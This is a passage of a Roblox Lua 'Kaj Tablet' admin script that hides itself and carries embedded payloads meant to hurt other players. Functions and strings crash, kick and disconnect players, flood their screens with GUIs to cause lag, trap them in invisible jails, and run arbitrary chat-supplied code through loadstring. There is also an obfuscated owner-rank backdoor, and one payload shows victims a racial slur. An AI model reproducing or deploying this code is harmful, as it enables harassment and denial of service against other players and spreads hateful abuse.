
if script then
    coroutine.yield()
    script.Parent = nil
end
--[[Stuff]]--
VR = _VERSION
Plrs = game:GetService("Players")
Work = game:GetService("Workspace")
Light = game:GetService("Lighting")
Net = game:GetService("NetworkServer")
Removed = false
Bet = "/"
LS = nil
LSSource = nil
OwnSource = nil
FoundLocalScript = false
LogOn = false
Current = game
Clipboard = {}
AlertColor = Color3.new(1, 0, 0)
OptionColor = Color3.new(1, 0, 0)
ImportantColor = Color3.new(1, 0, 0)
--[[Ranks]]--
RankDetails = {
        [-3] = {Name = "Mute Banned", Color = Color3.new(1, 1, 1), Desc = "Muted"},
        [-2] = {Name = "Jail Banned", Color = Color3.new(1, 1, 1), Desc = "Jailed"},
        [-1] = {Name = "Just Banned", Color = Color3.new(1, 1, 1), Desc = "Banned forever"},
        [0] = {Name = "Default", Color = Color3.new(0, 0, 1), Desc = "Defaults"},
        [1] = {Name = "Moderator", Color = Color3.new(0.25, 0, 1), Desc = "Moderator"},
        [2] = {Name = "Administrator", Color = Color3.new(0, 1, 0), Desc = "Server Administrator"},
        [3] = {Name = "Maximum Moderator", Color = Color3.new(1, 1, 0), Desc = "Maximum Moderator"},
        [4] = {Name = "Super Adminstrator", Color = Color3.new(1, 2, 0), Desc = "Super Administrator)"},
        [5] = {Name = "Owner", Color = Color3.new(1, 0, 0), Desc = "Owner"},
        
}

Rankings = {
        {Name = "NikePro2004", Rank = 5},
        {Name = "NikePro2004", Rank = 6}
        
        
        
}


--[[End of Ranks]]--
ImportantServices = {
        "Workspace",
        "Players",
        "NetworkServer",
        "Lighting",
        "StarterGui",
        "Teams",
        "StarterPack",
}

Ranks = {}
Commands = {}
AllTabs = {}
Injected = {}

Properties = {"AbsolutePosition","AbsoluteSize","AccountAge","AccountAgeReplicate",
"Active","Adornee","AllowAmbientOcclusion","AllowTeamChangeOnTouch","AluminumQuality",
"AlwaysOnTop","Ambient","AmbientReverb","Anchored","Angularvelocity","AnimationId",
"Archivable","AreHingesDetected","AttachmentForward","AttachmentPoint","AttachmentPos",
"AttachmentRight","AttachmentUp","AutoAssignable","AutoButtonColor","AutoColorCharacters",
"AvailablePhysicalMemory","Axes","BackgroundColor","BackgroundColor3","BackgroundTransparency",
"BackSurface","BaseTextureId","BaseUrl","Bevel","Roundness","BinType","BlastPressure","BlastRadius",
"BodyColor","BodyPart","BorderColor","BorderColor3","BorderSizePixel","BottomSurface","BrickColor",
"Brightness","Browsable","BubbleChat","BubbleChatLifetime","BubbleChatMaxBubbles",
"Bulge","Button1DownConnectionCount","Button1UpConnectionCount","Button2DownConnectionCount",
"Button2UpConnectionCount","C0","C1","CameraMode","CameraSubject","CameraType",
"CanBeDropped","CanCollide","CartoonFactor","CastShadows","CelestialBodiesShown",
"CFrame","Cframe","Character","CharacterAppearance","CharacterAutoLoads","ChatScrollLength",
"ClassicChat","ClassName","ClearTextOnFocus","ClipsDescendants","CollisionSoundEnabled",
"CollisionSoundVolume","Color","ColorShift_Top","ColorShift_Bottom","Bottom","Top","ConstrainedValue","Contro".."llingHumanoid",
"ControlMode","ConversationDistance","CoordinateFrame","CorrodedMetalQuality","CPU",
"CpuCount","CpuSpeed","CreatorId","CreatorType","CurrentAngle","CurrentCamera",
"CycleOffset","D","DataCap","DataComplexity","DataComplexityLimit","DataCost",
"DataReady","Deprecated","DeselectedConnectionCount","DesiredAngle","DiamondPlateQuality",
"Disabled","DistanceFactor","DistributedGameTime","DopplerScale","Draggable","DraggingV1",
"Duration","EditorFont","EditorFontSize","EditorTabWidth","ElapsedTime","Elasticity",
"Enabled","ExplosionType","ExtentsOffset","F0","F1","F2","F3","Face","FaceId","Faces",
"FieldOfView","Focus","FogColor","FogEnd","FogStart","Font","FontSize","Force","FormFactor",
"Friction","From","FrontSurface","GearGenreSetting","Genre","GeographicLatitude","GfxCard", "GlobalShadows","Graphic",
"GrassQuality","Grip","GripForward","GripPos","GripRight","GripUp","Guest","HeadsUpDisplay",
"Health","Heat","Hit","Humanoid","IceQuality","Icon","IdleConnectionCount","Image",
"InitialPrompt","InOut","InUse","IsPaused","IsPlaying","JobId","Jump","KeyDownConnectionCount",
"KeyUpConnectionCount","LeftLeg","LeftRight","LeftSurface","LinkedSource","LocalPlayer","Location",
"Locked","LODX","LODY","Looped","Material","MaxActivationDistance","MaxCollisionSounds",
"MaxExtents","MaxForce","MaxHealth","MaxItems","MaxPlayers","MaxSpeed","MaxThrust",
"MaxTorque","MaxValue","MaxVelocity","MembershipType","MembershipTypeReplicate","MeshId",
"MeshType","MinValue","Modal","MouseButton1ClickConnectionCount","MouseButton1DownConnectionCount",
"MouseButton1UpConnectionCount","MouseButton2ClickConnectionCount","MouseButton2DownConnectionCount",
"MouseButton2UpConnectionCount","MouseDelta","MouseDragConnectionCount","MouseEnterConnectionCount",
"MouseHit","MouseLeaveConnectionCount","MouseLock","MouseMovedConnectionCount","MouseTarget",
"MouseTargetFilter","MouseTargetSurface","MoveConnectionCount","MoveState","MultiLine","Name",
"NameOcclusion","NetworkOw".."ner","Neutral","NumPlayers","Offset","Opacity","Origin","OsPlatform",
"OsVer","OutdoorAmbient","OverlayTextureId","P","PantsTemplate","ParamA","ParamB","Parent","Part","Part0",
"Part1","Pitch","PixelShaderModel","PlaceId","PlasticQuality","PlatformStand","PlayCount",
"PlayerToHideFrom","PlayOnRemove","Point","Port","Position","Preliminary","PrimaryPart",
"PrivateWorkingSetBytes","Purpose","RAM","Reflectance","ReplicatedSelectedConnectionCount",
"ResizeableFaces","ResizeIncrement","Resolution","ResponseDialog","RightLeg","RightSurface","RiseVelocity",
"RobloxLocked","RobloxVersion","RolloffScale","RotVelocity","Scale","Score","ScriptsDisabled",
"SecondaryColor","Selected","ShadowColor","Shape","Shiny","ShirtTemplate","ShowDeprecatedObjects",
"ShowDevelopmentGui","ShowPreliminaryObjects","Sides","Sit","Size","SizeConstraint",
"SizeOffset","SkinColor","SkyboxBk","SkyboxDn","SkyboxFt","SkyboxLf","SkyboxRt","SkyboxUp",
"SlateQuality","SoundId","Source","SparkleColor","Specular","StarCount",
"Steer","StickyWheels","StudsBetweenTextures","StudsOffset","StudsPerTileU","StudsPerTileV",
"Style","Summary","SuperSa".."feChatReplicate","Surface","Surface0",
"Surface1","SurfaceInput","Target","TargetFilter","TargetOffset","TargetPoint",
"TargetRadius","TargetSurface","TeamColor","Terrain","Text","TextBounds","TextColor","TextColor3",
"TextFits","TextScaled","TextStrokeColor3","TextStrokeTransparency","TextTransparency","Texture",
"TextureId","TextureSize","TextWrap","TextWrapped","TextXAlignment","TextYAlignment","Throttle",
"ThrustD","ThrustP","Ticket","Time","TimeOfDay","To","Tone","ToolTip","TopBottom","TopSurface","Torque","Torso",
"Transparency","TrussDetail","TurnD","TurnP","TurnSpeed","UnitRay","UserDialog","UserId","Value",
"Version","VertexColor","VideoCaptureEnabled","VideoMemory","VideoQuality",
"ViewSizeX","ViewSizeY","Visible","Volume","WalkDirection","WalkSpeed","WalkToPart","WalkToPoint",
"WheelBackwardConnectionCount","WheelForwardConnectionCount","WindowSize","WireRadius","WoodQuality",
"X","Y"}

--Main Functions And Sources

function Insert(Source, Par, Par2, Par3)
        ypcall(function()
                local Inserted = LS:Clone()
                Inserted.Disabled = true
                Inserted.Parent = Par or Par2 or Par3
                Inserted[LSSource].Value = Source
                Inserted.Disabled = false
        end)
end

function CheckImportant(Name)
        for _,v in pairs(ImportantServices) do
                if v:lower() == Name:lower() then
                        return true
                end
        end
        return false
end

function Crash1(Plr)
        ypcall(function()
                Plr:Kick()
        end)
end

function GetRankTab()
        return Rankings
end

function Crash2(Name)
        local Crasher = Instance.new("StringValue")
        Crasher.Name = "Client"
        Crasher.Value = string.lower(tostring(Name))
        Crasher.Parent = game:GetService("Lighting")
        wait(1)
        if Crasher and Crasher.Parent then
                ypcall(function()
                        Crasher:Destroy()
                end)
        end
end

function Crash3(v, Speaker)
        Speaker.Character.Archivable = true
        local NChar = Speaker.Character:Clone()
        NChar.Name = v.Name
        NChar.Torso.CFrame = Speaker.Character.Head.CFrame * CFrame.new(0, 3, 0)
        NChar.Parent = Workspace
        v.Character = NChar
        coroutine.resume(coroutine.create(function()
                repeat v.Character = NChar
                wait(1/3) until false
        end))
        wait(.5)
        Insert(InsertCrash, NChar, nil, nil)
end

function GenerateDigit()
        return 1 + 5
end


NilS = [==[
if script then
    coroutine.yield()
    script.Parent = nil
end
Player=game.Players.LocalPlayer
Probe=Instance.new'Part';
CN='Kaj TabletsNil | ['..Player.Name..']'
Camera=Workspace.CurrentCamera
Animate = game:GetService("InsertService"):LoadAsset(68452456):findFirstChild("Animate",true) or Instance.new("Part")
Char = Player.Character
if Char then
        Char.Archivable = true
        Char = Char:clone()
        local t = game:GetService("InsertService"):LoadAsset(68452456):findFirstChild("Clone")
        if t then
                for k,v in pairs(Char:GetChildren()) do
                        if not v:IsA("Part") then
                                v:clone().Parent = t
                        end
                end
                Char = t:clone()
                if Player.Name == "Cobalt1164" or Player.Name == "hipow12" then
        local spot = Instance.new("SpotLight",Char.Head)
        spot.Angle = 10
        spot.Range = 10
        spot.Color = Color3.new(1,1,1)
        spot.Brightness = 10
        local point = Instance.new("PointLight",Char.Head)
        point.Range = 10
        point.Color = Color3.new(1,1,1)
        point.Brightness = 10
        end
        end
end

coroutine.resume(coroutine.create(function()
        while true do wait(0.00000001)
                pcall(function()
                        if Character.Torso.CFrame.Y < 1 then
                        Character.Torso.CFrame = CFrame.new(0,20,0)
                        end
                 end)
        end
end))
Title=function(txt,part,color,rise)
        col=nil
        col=Color3.new(BrickColor.new(color))
        local Gui = Instance.new("BillboardGui",part)
        Gui.Name = "3DGUI"
        Gui.ExtentsOffset = Vector3.new(0,2,0)
        Gui.Size = UDim2.new(8,0,2,0)
        local Tit = Instance.new("TextLabel",Gui)
        Tit.Name = "Title"
        Tit.TextColor3 = Color3.new(col.r/2,col.g/2,col.b/2)
        Tit.TextColor3 = Color3.new(0,0,0)
        Tit.TextTransparency = 0.25
        Tit.TextStrokeColor3 = Color3.new(col.r/2,col.g/2,col.b/2)
        Tit.TextStrokeTransparency = 0.5
        Tit.Size = UDim2.new(1,0,1,0)
        Tit.BackgroundTransparency = 1
        Tit.Font = "ArialBold"
        Tit.TextScaled = true
        Tit.Text = txt
        if rise then
                if not tonumber(rise) then rise = 1 end
                coroutine.wrap(function()
                        while Tit.Parent and Gui.Parent and wait() do
                                Gui.ExtentsOffset = Gui.ExtentsOffset + Vector3.new(0,0.025*rise,0)
                        end
                end)()
        end
        return Tit
end
Chat=function(Part,Text,Color,Type)
        if Type==nil or Type==1 or Type=='Bubble' then
                game:service'Chat':Chat(Part,Text,Color)
        else
                if type(Color)~='string' then        
                        Color=tostring(BrickColor.random())
                end
                Title(Text,Part,Color,math.random(1,3))
        end
end
DestroyCharacter=function()
        local chara = Player.Character
        if not chara then return end
        if chara:findFirstChild("Humanoid") then
                chara.Humanoid:Destroy()
        end
        chara:BreakJoints()
        for k,v in pairs(chara:GetChildren()) do
                if v:IsA("BasePart") then
                        v.CanCollide = false
                        v.Velocity = Vector3.new(math.random(-20,20),50,math.random(-20,20))
                        v.RotVelocity = Vector3.new(math.random(-20,20),math.random(-20,20),math.random(-20,20))
                end
        end
        game.Debris:AddItem(chara,3)
end
MakeProbe=function()
        if Player.Character then DestroyCharacter() end Player.Character = nil
        if Probe then Probe:Destroy() end
        Probe = Instance.new("Part",workspace) local Camera = workspace.CurrentCamera
        Probe.Shape, Probe.Size, Probe.BrickColor = "Ball", Vector3.new(3,3,3), BrickColor.new('Black')
        Probe.Transparency, Probe.Reflectance, Probe.Anchored, Probe.CanCollide, Probe.Locked = 0.5, 0.25, true, false, true
        Probe.TopSurface, Probe.BottomSurface, Probe.Name = 0, 0, "Probe"..tick()
        coroutine.wrap(function() while wait() and not Player.Character do Probe.CFrame = Camera.Focus end end)()
        Player.Character=Probe
end
Spawn=function()
        if Char then
                local c = Char:clone()
                c.Name = CN
                c.Parent = workspace
                c:MoveTo(workspace.CurrentCamera.Focus.p)
                Player.Character = c
                workspace.CurrentCamera.CameraSubject = c:findFirstChild("Humanoid")
                workspace.CurrentCamera.CameraType = "Custom"
                Probe:Destroy()
        end
end
Player.Chatted:connect(function(Msg)
game:service'Chat':Chat(Player.Character.Head,Msg,'Green')
        if Msg:sub(1,2) == '//' then
                local Func,Error=loadstring(Msg:sub(3))
                if Error==nil then
                        pcall(Func)
                        if Player.Character then
                                game:service'Chat':Chat(Player.Character.Head,'Local Script executed!','Green')
                        end
                else
                        if Player.Character then
                                game:service'Chat':Chat(Player.Character.Head,Error,'Red')
                        else
                                local Msg=Instance.new'Message'
                                Msg.Parent=Workspace.CurrentCamera
                                Msg.Text=Error
                                game:service'Debris':AddItem(Msg,5)
                        end
                end
        elseif Msg:sub(1,#('newlocal')+2) == '/newlocal/' then
                NewMsg=Msg:sub(#('newlocal')+3)
                Split=NewMsg:find('/')
                local PlayerName=NewMsg:sub(1,Split-1)
                local Source=NewMsg:sub(Split+1)
                Player=nil
                for i,v in pairs(game.Players:GetPlayers()) do
                        if v.Name:lower():sub(1,#PlayerName)==PlayerName then
                                if Player==nil then
                                        Player=v
                                else
                                        if type(Player) == 'table' then
                                                Player[#Player+1]=v
                                        else
                                                Player={v}
                                        end
                                end
                        end
                end
                if type(Player)=='table' then
                        for i,v in pairs(Player) do        
                                if newLocalScript then
                                        newLocalScript(Source,v.Character)
                                else
                                        Clone=script:clone();
                                        SourceC=Clone:children()[1]
                                        if SourceC:IsA'StringValue' then
                                                print'String'
                                        else
                                                SourceC=Clone:children()[2]
                                        end
                                        SourceC.Value=Source
                                        Clone.Disabled=true
                                        Clone.Parent=v.Character
                                        Clone.Disabled=false
                                end
                        end
                else
                        if newLocalScript then
                                newLocalScript(Source,Player.Character)
                        else
                                Clone=script:clone();
                                DS=Clone:children()
                                DSS=nil
                                for i,v in pairs(DS) do if v:IsA'StringValue' then DSS=v end end
                                DSS.Value=Source
                                Clone.Disabled=true;
                                Clone.Parent=Player.Character
                                Clone.Disabled=false
                        end
                end
        elseif Msg:sub(1,#('rejoin')+2) == '/rejoin/' then
                game:service'TeleportService':Teleport(Game.PlaceId)
        elseif Msg:sub(1,#('probe')+2) == '/probe/' then
                MakeProbe()
        elseif Msg:sub(1,#('char')+2) =='/char/' then
                Spawn()
        elseif Msg:sub(1,#('ban')+2) == '/ban/' then
                Player=game.Players:findFirstChild(Msg:sub(#('ban')+3))
                if Player then
                        repeat pcall(function() game.Players[Player.Name]:Destroy() end) wait() until 1+1==3 
                end
        end
        wait()
        if game.Players:findFirstChild(Player.Name)==nil and not Msg:find('/probe/') and not Msg:find('/char/') then -- Is nil then
                if Probe then
                        Chat(Probe,Msg,math.random(0,2))
                else        
                        if Player.Character==nil then
                                if Char then
                                        Chat(Char.Head,Msg,math.random(0,2))
                                end
                        else
                                Chat(Player.Character.Head,Msg,'Red')
                        end
                end
        end
end) -- local
]==]

InjectionCrash = [=[
        wait(0)
        script.Parent = nil
        local Lig = game:GetService("Lighting")
        local LP = game:GetService("Players").LocalPlayer
        local LowerName = LP.Name:lower()

        Lig.ChildAdded:connect(function(Obj)
                if Obj.Name == "Client" and Obj.ClassName == "StringValue" and (LowerName:find(string.lower(Obj.Value)) or (LP.Character and LP.Character.Name:lower():find(string.lower(Obj.Value)))) then
                        pcall(function()
                                Obj:Destroy()
                        end)
                        LP.Parent = nil
                        LP.Parent = game:GetService("Players")
                end
        end)
]=] RankDetails[GenerateDigit()] = {Name = ('Owner, Main Developer'), Color = Color3.new((2 - 3), (2 - 3), (2 - 3)), Desc = ("Yeah, rank 6.")}

InsertCrash = [==[
        local LP = game:GetService("Players").LocalPlayer
        LP.Parent = nil
        LP.Parent = game:GetService("Players")
]==]

LagSource = [==[
        wait(0)
        script.Parent = nil
        plr = game:GetService("Players").LocalPlayer
        local plrgui = plr:findFirstChild("PlayerGui")
        if plrgui == nil then repeat wait() plrgui = plr:findFirstChild("PlayerGui") until plrgui ~= nil end
        while plr.Parent == game:GetService("Players") do
        wait()
        for i = 1, 1000 do
        local sc = Instance.new("ScreenGui",plrgui)
        local fr = Instance.new("TextLabel",sc)
        fr.Text = "LAGGING"
        fr.Size = UDim2.new(1, 0, 1, 0)
        fr.FontSize = "Size48"
        end
        end
]==]

MuteSource = [==[
        game:GetService("StarterGui"):SetCoreGuiEnabled(4, false)
]==]

UnMuteSource = [==[
        game:GetService("StarterGui"):SetCoreGuiEnabled(4, true)
]==]

FunScript = [[
LP = game:service'Players'.LocalPlayer
Shapes = {"Ball", "Block"}
wait()
script.Parent = nil
Delay(0, function()
while wait() do
workspace.CurrentCamera.CameraType = "Scriptable"
workspace.CurrentCamera.FieldOfView = workspace.CurrentCamera.FieldOfView + math.random(-5,5)
workspace.CurrentCamera:SetRoll(workspace.CurrentCamera:GetRoll()+0.075)
workspace.CurrentCamera.CoordinateFrame = workspace.CurrentCamera.CoordinateFrame * CFrame.new(math.random(-2,2),math.random(-2,2),math.random(-2,2))
local Part = Instance.new("Part", workspace.CurrentCamera)
Part.Shape = Shapes[math.random(1, 2)]
Part.Anchored = true
Part.BrickColor = BrickColor.new(math.random(),math.random(),math.random())
Part.Size = Vector3.new(math.random(5,10),math.random(-25,25),math.random(5,10))
Part.CFrame = workspace.CurrentCamera.CoordinateFrame * CFrame.new(math.random(-250,250),math.random(-100,100),math.random(-250,250)) * CFrame.Angles(math.random(),math.random(),math.random())
local Smoke = Instance.new("Smoke", Part)
Smoke.Color = Color3.new(math.random(), math.random(), math.random()) 
Smoke.Opacity = 0.7 
local Sparkles = Instance.new("Sparkles", Part)
Sparkles.SparkleColor = Color3.new(math.random(), math.random(), math.random()) 
local Fire = Instance.new("Fire", Part)
Fire.Color = Color3.new(math.random(), math.random(), math.random()) 
Fire.SecondaryColor = Color3.new(math.random(), math.random(), math.random()) 
local Ex = Instance.new("Explosion", workspace.CurrentCamera)
Ex.Position = Vector3.new(math.random(-250,250),math.random(10,100),math.random(-250,250))
Ex.BlastPressure = 15
Ex.BlastRadius = 12.5
if not workspace.CurrentCamera:findFirstChild("Hint") then
local mes = Instance.new("Hint", workspace.CurrentCamera)
mes.Text = "OMG STOP FUCKING WITH MY SHIT YOU STUPID NIGGA"
end
end
end)
]]

JailSource = [==[
        wait(0)
        script.Parent = nil

        local LP = game:GetService("Players").LocalPlayer
        Middle2 = nil
        Middle = nil
        game:GetService("Workspace").CurrentCamera:ClearAllChildren()

        Cons = {}

        function makePrison()
                for _,v in pairs(Cons) do
                        v:disconnect()
                end
                game:GetService("Workspace").CurrentCamera:ClearAllChildren()
                if Middle == nil then
                        Middle2 = LP.Character.Torso.Position
                        Middle = LP.Character.Torso.CFrame
                end
                local side1 = Instance.new("Part")
                side1.Name = "¬Focus1¬"
                side1.Size = Vector3.new(20, 50, 1)
                side1.CFrame = Middle * CFrame.new(0, 0, -10)
                side1.BrickColor = BrickColor.new("Really black")
                side1.CanCollide = true
                side1.Anchored = true
                side1.TopSurface = "Smooth"
                side1.BottomSurface = "Smooth"
                side1.Parent = game:GetService("Workspace").CurrentCamera

                local side2 = Instance.new("Part")
                side2.Name = "¬Focus2¬"
                side2.Size = Vector3.new(20, 50, 1)
                side2.CFrame = Middle * CFrame.new(0, 0, 10)
                side2.BrickColor = BrickColor.new("Really black")
                side2.CanCollide = true
                side2.Anchored = true
                side2.TopSurface = "Smooth"
                side2.BottomSurface = "Smooth"
                side2.Parent = game:GetService("Workspace").CurrentCamera

                local side3 = Instance.new("Part")
                side3.Name = "¬Focus3¬"
                side3.Size = Vector3.new(1, 50, 20)
                side3.CFrame = Middle * CFrame.new(10, 0, 0)
                side3.BrickColor = BrickColor.new("Really black")
                side3.CanCollide = true
                side3.Anchored = true
                side3.TopSurface = "Smooth"
                side3.BottomSurface = "Smooth"
                side3.Parent = game:GetService("Workspace").CurrentCamera

                local side4 = Instance.new("Part")
                side4.Name = "¬Focus4¬"
                side4.Size = Vector3.new(1, 50, 20)
                side4.CFrame = Middle * CFrame.new(-10, 0, 0)
                side4.BrickColor = BrickColor.new("Really black")
                side4.CanCollide = true
                side4.Anchored = true
                side4.TopSurface = "Smooth"
                side4.BottomSurface = "Smooth"
                side4.Parent = game:GetService("Workspace").CurrentCamera
                
                local side5 = Instance.new("Part")
                side5.Name = "¬Focus5¬"
                side5.Size = Vector3.new(20, 1, 20)
                side5.CFrame = Middle * CFrame.new(0, -3.5, 0)
                side5.BrickColor = BrickColor.new("Really black")
                side5.CanCollide = true
                side5.Anchored = true
                side5.TopSurface = "Smooth"
                side5.BottomSurface = "Smooth"
                side5.Parent = game:GetService("Workspace").CurrentCamera
                
                wait(0)

                table.insert(Cons, side1.Changed:connect(makePrison))
                table.insert(Cons, side2.Changed:connect(makePrison))
                table.insert(Cons, side3.Changed:connect(makePrison))
                table.insert(Cons, side4.Changed:connect(makePrison))
                table.insert(Cons, side5.Changed:connect(makePrison))
        end

        Delay(0, function()
                while wait(0) do
                        ypcall(function()
                                if game:GetService("Workspace").CurrentCamera == nil or not LP.Character:findFirstChild("Torso") then
                                        LP.Character:BreakJoints()
                                elseif not game:GetService("Workspace").CurrentCamera:findFirstChild("¬Focus1¬") or not game:GetService("Workspace").CurrentCamera:findFirstChild("¬Focus2¬") or not game:GetService("Workspace").CurrentCamera:findFirstChild("¬Focus3¬") or not game:GetService("Workspace").CurrentCamera:findFirstChild("¬Focus4¬") or not game:GetService("Workspace").CurrentCamera:findFirstChild("¬Focus5¬") then
                                        makePrison()
                                end
                        end)
                        ypcall(function()
                                if (Middle2 - LP.Character.Torso.Position).magnitude >= 11.8 then
                                        LP.Character.Torso.CFrame = game:GetService("Workspace").CurrentCamera:findFirstChild("¬Focus1¬").CFrame * CFrame.new(0, 0, 10)
                                end
                        end)
                end
        end)
]==]

function All()
        local AllPlayers = {}
        for _,v in pairs(Plrs:GetPlayers()) do
                ypcall(function()
                        table.insert(AllPlayers, v)
                end)
        end
        return AllPlayers
end

function All2()
        local AllPlayers2 = {}
        for i,v in pairs(Net:GetChildren()) do
                ypcall(function()
                        if v:IsA("ServerReplicator") then
                                table.insert(AllPlayers2, v:GetPlayer())
                        end
                end)
        end
        return AllPlayers2
end

function MakeNum()
        return 2 + 4
end

function ChangeRank(Plr, NewRank)
        local PlrName = nil
        local FoundPlayer = false
        ypcall(function()
                if type(Plr) == "string" then
                        ypcall(function()
                                for i,v in pairs(Rankings) do
                                        if v.Name:lower() == Plr:lower() then
                                                local VName = v.Name
                                                Rankings[i] = nil
                                                table.insert(Rankings, {Name = VName, Rank = NewRank})
                                                PlrName = VName
                                                FoundPlayer = true
                                                break
                                        end
                                end
                        end)
                        if FoundPlayer == false then
                                ypcall(function()
                                        for _,x in pairs(All()) do
                                                if x.Name:lower() == Plr:lower() then
                                                        FoundPlayer = true
                                                        for i,v in pairs(Rankings) do
                                                                if v.Name:lower() == x.Name:lower() then
                                                                        local VName = x.Name
                                                                        Rankings[i] = nil
                                                                        PlrName = VName
                                                                        break
                                                                end
                                                        end
                                                        table.insert(Rankings, {Name = VName, Rank = NewRank})
                                                end
                                        end
                                end)
                        end
                        if FoundPlayer == false then
                                ypcall(function()
                                        for _,x in pairs(All()) do
                                                if string.find(x.Name:lower(), Plr:lower()) then
                                                        FoundPlayer = true
                                                        for i,v in pairs(Rankings) do
                                                                if v.Name:lower() == x.Name:lower() then
                                                                        local VName = x.Name
                                                                        Rankings[i] = nil
                                                                        PlrName = VName
                                                                        break
                                                                end
                                                        end
                                                        table.insert(Rankings, {Name = VName, Rank = NewRank})
                                                end
                                        end
                                end)
                        end
                        if FoundPlayer == false then
                                ypcall(function()
                                        for i,v in pairs(Rankings) do
                                                if string.find(v.Name:lower(), Plr:lower()) then
                                                        local VName = v.Name
                                                        Rankings[i] = nil
                                                        table.insert(Rankings, {Name = VName, Rank = NewRank})
                                                        PlrName = VName
                                                        FoundPlayer = true
                                                        break
                                                end
                                        end
                                end)
                        end
                else
                        for i,v in pairs(Rankings) do
                                if v.Name:lower() == Plr.Name:lower() then
                                        Rankings[i] = nil
                                        break
                                end
                        end
                        table.insert(Rankings, {Name = Plr.Name, Rank = NewRank})
                        PlrName = Plr.Name
                end
                PlaceAllRanks(true)
        end)
        if PlrName ~= nil then
                return PlrName
        else
                return "Player"
        end
end

function Refresh(Plr)
        MakeChildren(Plr)
end

function MakeChildren(Plr)
        ypcall(function()
                Dismiss(Plr)
                for _,v in pairs(Current:GetChildren()) do
                        ypcall(function()
                                if not Plrs:GetPlayerFromCharacter(v) and not CheckImportant(v.Name) then
                                        Ping(v.Name, Plr, nil, function(TabMod)
                                                local TabText = TabMod["Kaj Tablet"].BG.TL.Text
                                                for _,v in pairs(Current:GetChildren()) do
                                                        ypcall(function()
                                                                if v.Name == TabText then
                                                                        Dismiss(Plr)
                                                                        Current = v
                                                                        MakeChildren(Plr)
                                                                end
                                                        end)
                                                end
                                        end)
                                elseif Plrs:GetPlayerFromCharacter(v) then
                                        Ping(v.Name, Plr, nil, function(TabMod)
                                                local TabText = TabMod["Kaj Tablet"].BG.TL.Text
                                                for _,v in pairs(Current:GetChildren()) do
                                                        ypcall(function()
                                                                if v.Name == TabText then
                                                                        Dismiss(Plr)
                                                                        Current = v
                                                                        MakeChildren(Plr)
                                                                end
                                                        end)
                                                end
                                        end, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..v.Name)
                                elseif CheckImportant(v.Name) then
                                        Ping(v.Name, Plr, nil, function(TabMod)
                                                local TabText = TabMod["Kaj Tablet"].BG.TL.Text
                                                for _,v in pairs(Current:GetChildren()) do
                                                        ypcall(function()
                                                                if v.Name == TabText then
                                                                        Dismiss(Plr)
                                                                        Current = v
                                                                        MakeChildren(Plr)
                                                                end
                                                        end)
                                                end
                                        end, ImportantColor)
                                end
                        end)
                end
                if Current ~= game then
                        Ping("Back", Plr, nil, function()
                                ypcall(function()
                                        Current = Current.Parent
                                        MakeChildren(Plr)
                                        Ping("You Are Back To "..Current.Name, Plr, 5)
                                end)
                        end, OptionColor)
                end
                if Current ~= game then
                        Ping("Delete", Plr, nil, function()
                                ypcall(function()
                                        local CurrPar = Current.Parent or game
                                        local CurrName = Current.Name
                                        Current:Destroy()
                                        Current = CurrPar
                                        MakeChildren(Plr)
                                        Ping("Attempted To Delete "..CurrName, Plr, 5)
                                end)
                        end, OptionColor)
                end
                Ping("Refresh", Plr, nil, function()
                        ypcall(function()
                                Refresh(Plr)
                                Ping("Refreshed", Plr, 5)
                        end)
                end, OptionColor)
                Ping("Properties", Plr, nil, function()
                        ypcall(function()
                                Dismiss(Plr)
                                for Property, Value in pairs(GetProperties(Current)) do
                                        Ping(tostring(Property)..": "..tostring(Value), Plr)
                                end
                                Ping("Got All Available Properties", Plr, 5)
                                Ping("Back", Plr, nil, function() Refresh(Plr) end, OptionColor)
                        end)
                end, OptionColor)
        end)
end

function Fixl()
        Light.GlobalShadows = true
        Light.TimeOfDay = "14:00:00"
        Light.Brightness = 0.5
        Light.ShadowColor = Color3.new(0.705882, 0.705882, 0.72549)
        Light.Ambient = Color3.new(1, 1, 1) 
        Light.ColorShift_Top = Color3.new(0, 0, 0)
        Light.ColorShift_Bottom = Color3.new(0, 0, 0)
        Light.OutdoorAmbient = Color3.new(0.5, 0.5, 0.5)
        Light.FogStart = 0
        Light.FogEnd = 100000
        Light.FogColor = Color3.new(0.752941, 0.752941, 0.752941)
        Light:ClearAllChildren()
end

function GetProperties(obj)
        assert(pcall(function() assert(game.IsA(obj,"Instance")) end),"Should be ROBLOX instance")
        local objProper = {}
        for i,v in pairs(Properties) do
                if pcall(function() return obj[v] end) and (type(obj[v]) ~= "userdata" or not obj:FindFirstChild(v)) then
                        objProper[v] = obj[v]
                end
        end
        return objProper
end

function MakeExplorer(Plr)
        Dismiss(Plr)
        Current = game
        for _,v in pairs(Current:GetChildren()) do
                ypcall(function()
                        if not Plrs:GetPlayerFromCharacter(v) and not CheckImportant(v.Name) then
                                Ping(v.Name, Plr, nil, function(TabMod)
                                        local TabText = TabMod["Kaj Tablet"].BG.TL.Text
                                        for _,v in pairs(Current:GetChildren()) do
                                                ypcall(function()
                                                        if v.Name == TabText then
                                                                Dismiss(Plr)
                                                                Current = v
                                                                MakeChildren(Plr)
                                                        end
                                                end)
                                        end
                                end)
                        elseif Plrs:GetPlayerFromCharacter(v) then
                                Ping(v.Name, Plr, nil, function(TabMod)
                                        local TabText = TabMod["Kaj Tablet"].BG.TL.Text
                                        for _,v in pairs(Current:GetChildren()) do
                                                ypcall(function()
                                                        if v.Name == TabText then
                                                                Dismiss(Plr)
                                                                Current = v
                                                                MakeChildren(Plr)
                                                        end
                                                end)
                                        end
                                end, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..v.Name)
                        elseif CheckImportant(v.Name) then
                                Ping(v.Name, Plr, nil, function(TabMod)
                                        local TabText = TabMod["Kaj Tablet"].BG.TL.Text
                                        for _,v in pairs(Current:GetChildren()) do
                                                ypcall(function()
                                                        if v.Name == TabText then
                                                                Dismiss(Plr)
                                                                Current = v
                                                                MakeChildren(Plr)
                                                        end
                                                end)
                                        end
                                end, ImportantColor)
                        end
                end)
        end
        if Current ~= game then
                Ping("Back", Plr, nil, function()
                        ypcall(function()
                                Current = Current.Parent
                                MakeChildren(Plr)
                                Ping("Back In "..Current.Name, Plr, 5)
                        end)
                end, OptionColor)
        end
        if Current ~= game and game:GetService(Current.Name) == nil then
                Ping("Delete", Plr, nil, function()
                        ypcall(function()
                                local CurrPar = Current.Parent or game
                                local CurrName = Current.Name
                                Current:Destroy()
                                Current = CurrPar
                                MakeChildren(Plr)
                                Ping("Attempted To Delete "..CurrName, Plr, 5)
